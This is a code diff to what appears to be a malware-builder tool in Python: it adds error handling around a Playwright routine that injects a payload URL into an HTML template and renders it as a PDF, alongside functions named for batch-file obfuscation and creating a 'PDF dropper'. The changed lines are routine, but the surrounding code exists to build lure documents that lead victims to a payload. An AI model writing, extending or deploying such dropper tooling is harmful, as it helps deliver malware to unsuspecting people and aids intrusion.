@@ -68,19 +68,32 @@ def obfuscate_bat(content, method):
 
 async def html_to_pdf(html_path, output_pdf_path, payload_url):
     """Converts HTML to PDF using Playwright."""
-    async with async_playwright() as p:
-        browser = await p.chromium.launch()
-        page = await browser.new_page()
+    try:
+        async with async_playwright() as p:
+            try:
+                browser = await p.chromium.launch()
+            except Exception as e:
+                if "executable doesn't exist" in str(e).lower() or "playwright install" in str(e).lower():
+                    console.print("\n[error]Playwright browsers not found![/]")
+                    console.print("[info]Please run the following command to install them:[/]")
+                    console.print("[highlight]playwright install chromium[/]\n")
+                    sys.exit(1)
+                raise e
 
-        with open(html_path, 'r') as f:
-            html_content = f.read()
+            page = await browser.new_page()
 
-        # Inject payload URL into template
-        html_content = html_content.replace("[[PAYLOAD_URL]]", payload_url)
+            with open(html_path, 'r') as f:
+                html_content = f.read()
 
-        await page.set_content(html_content)
-        await page.pdf(path=output_pdf_path, format="Letter", print_background=True)
-        await browser.close()
+            # Inject payload URL into template
+            html_content = html_content.replace("[[PAYLOAD_URL]]", payload_url)
+
+            await page.set_content(html_content)
+            await page.pdf(path=output_pdf_path, format="Letter", print_background=True)
+            await browser.close()
+    except Exception as e:
+        console.print(f"[error]An error occurred during HTML to PDF conversion: {e}[/]")
+        sys.exit(1)
 
 async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method):
     with Progress(
